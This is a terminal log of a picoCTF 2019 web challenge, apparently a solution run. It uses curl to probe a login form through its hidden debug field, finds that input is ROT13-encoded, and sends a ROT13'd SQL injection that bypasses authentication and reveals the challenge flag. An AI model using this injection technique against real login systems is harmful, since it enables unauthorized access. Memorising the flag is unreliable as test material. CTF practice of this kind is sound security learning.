$ curl -s https://2019shell1.picoctf.com/problem/21874/login.html
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Admin Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">

                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

$ curl -s https://2019shell1.picoctf.com/problem/21874/login.php -d debug=1 -d "password=hi" | lolcat -t -p 20 -i -S 20;echo
<pre>password: hi
SQL query: SELECT * FROM admin where password = 'uv'
</pre><h1>Login failed.</h1>

$ curl -s https://2019shell1.picoctf.com/problem/21874/login.php -d debug=1 -d "password=hello" | lolcat -t -p 20 -i -S 20;echo
<pre>password: hello
SQL query: SELECT * FROM admin where password = 'uryyb'
</pre><h1>Login failed.</h1>

$ curl -s https://2019shell1.picoctf.com/problem/21874/login.php -d debug=1 -d "password='" | lolcat -t -p 20 -i -S 20;echo
<pre>password: '
SQL query: SELECT * FROM admin where password = '''
</pre>

$ curl -s https://2019shell1.picoctf.com/problem/21874/login.php -d debug=1 -d "password=' or 1=1 -- " | lolcat -t -p 20 -i -S 20;echo
<pre>password: ' or 1=1 --
SQL query: SELECT * FROM admin where password = '' be 1=1 -- '
</pre>

$ curl -s https://2019shell1.picoctf.com/problem/21874/login.php -d debug=1 -d "password=' be 1=1 -- " | lolcat -t -p 20 -i -S 20;echo
<pre>password: ' be 1=1 --
SQL query: SELECT * FROM admin where password = '' or 1=1 -- '
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_d78e3333}</p>
